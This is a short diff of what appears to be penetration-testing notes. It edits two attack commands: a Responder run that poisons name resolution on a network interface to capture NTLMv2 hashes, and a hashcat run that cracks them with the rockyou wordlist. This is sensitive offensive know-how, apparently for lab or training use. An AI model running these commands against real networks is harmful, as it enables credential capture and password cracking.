@@ -15,10 +15,10 @@ ls
 ```
 
 ```bash
-sudo responder -I ens224
+sudo responder -I tun0
 ```
 
 ```bash
-hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
+hashcat -m 5600 {{HASHFILE}} /usr/share/wordlists/rockyou.txt 
 ```
 
